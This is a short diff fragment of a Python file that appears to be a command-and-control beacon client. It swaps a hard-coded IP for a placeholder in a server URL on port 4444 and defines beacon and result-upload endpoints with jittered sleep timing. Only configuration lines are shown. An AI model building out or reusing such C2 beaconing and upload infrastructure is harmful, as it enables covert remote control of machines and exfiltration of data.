@@ -7,7 +7,7 @@ import json
 from cryptography.fernet import Fernet
 
 # Configuration
-SERVER_URL = "http://172.26.247.78:4444"
+SERVER_URL = "http://<IP>:4444"
 BEACON_ENDPOINT = "/api/status" # Beacon
 RESULT_ENDPOINT = "/api/upload" # Result
 # Sleep min and max for psudo random request times 
